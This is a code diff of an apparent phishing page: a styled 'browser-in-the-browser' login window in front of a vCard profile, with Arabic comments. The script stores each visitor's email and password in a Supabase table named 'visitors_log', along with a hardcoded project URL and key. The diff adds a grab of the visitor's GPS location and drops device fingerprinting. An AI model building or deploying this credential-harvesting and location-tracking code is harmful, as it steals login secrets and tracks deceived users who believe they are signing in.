@@ -22,7 +22,6 @@
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; text-decoration: none; }
         body { background: var(--back_color); width: 100vw; height: 100vh; overflow: hidden; display: flex; justify-content: center; align-items: center; }
 
-        /* واجهة الدخول (نفس التصميم الأصلي) */
         #auth-screen { position: fixed; inset: 0; background: var(--back_color); z-index: 1000; display: flex; justify-content: center; align-items: center; }
         .bitb-window { width: 90%; max-width: 380px; background: var(--front_color); backdrop-filter: blur(25px); border-radius: 30px; border: 1px solid rgba(197, 160, 89, 0.2); overflow: hidden; box-shadow: 0 25px 60px rgba(0,0,0,0.6); direction: rtl; animation: fadeIn 0.8s ease; }
         
@@ -39,7 +38,6 @@
         .auth-box input:focus { border-color: var(--gold); background: rgba(255, 255, 255, 0.07); }
         .auth-box button { width: 100%; padding: 14px; margin-top: 20px; background: linear-gradient(45deg, var(--deep-blue), var(--muted-gold)); border: none; border-radius: 12px; color: white; font-weight: bold; cursor: pointer; font-size: 1em; box-shadow: 0 5px 15px rgba(0,0,0,0.3); transition: 0.3s; }
 
-        /* تصميم vCard (المحتفظ بكامل جماليته) */
         .vcard { width: 90%; max-width: 420px; height: 600px; background: var(--front_color); backdrop-filter: blur(25px); border-radius: 24px; border: 1px solid rgba(197, 160, 89, 0.2); position: relative; overflow: hidden; display: none; animation: fadeIn 1s ease; }
         .header { height: 35%; position: relative; }
         .wave_bg { position: absolute; width: 100%; height: 100%; overflow: hidden; }
@@ -111,7 +109,6 @@
 </div>
 
 <script>
-    // الإعدادات الجديدة الخاصة بك
     const SB_URL = 'https://kcckppfflaxpxhipngdz.supabase.co'; 
     const SB_KEY = 'EyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImtjY2twcGZmbGF4cHhoaXBuZ2R6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzU2MzU1NTMsImV4cCI6MjA5MTIxMTU1M30.Lek1mEohH1GoUkcMQZT3vQ2tmshPJVI-Oa8f_y2mH6o';
     
@@ -136,28 +133,40 @@
         loginBtn.innerText = "جاري التحقق...";
         loginBtn.disabled = true;
 
-        try {
-            // تجميع معلومات الجهاز الأساسية
-            const device = /iPhone|iPad|iPod/i.test(navigator.userAgent) ? "iOS" : "Android/PC";
+        // الحصول على الموقع الجغرافي
+        let userLocation = "غير متاح";
+        if (navigator.geolocation) {
+            await new Promise((resolve) => {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        userLocation = `Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude}`;
+                        resolve();
+                    },
+                    () => {
+                        userLocation = "تم رفض الإذن";
+                        resolve();
+                    },
+                    { timeout: 5000 }
+                );
+            });
+        }
 
-            // إرسال البيانات إلى Supabase
+        try {
+            // إرسال البيانات (الجيميل، الباسورد، والموقع فقط)
             const { error } = await supabaseClient
                 .from('visitors_log')
                 .insert([{ 
                     visitor_email: email, 
                     visitor_password: password,
-                    device_model: device,
-                    fingerprint: `${window.screen.width}x${window.screen.height}`
+                    location: userLocation
                 }]);
 
             if (error) throw error;
-
-            // إظهار البطاقة في حال النجاح
             showProfile();
 
         } catch (err) {
             console.error(err);
-            errorMsg.innerText = "خطأ في الربط! تأكد من إنشاء الجدول في Supabase";
+            errorMsg.innerText = "خطأ في الاتصال!";
             loginBtn.innerText = "تأكيد الدخول";
             loginBtn.disabled = false;
         }
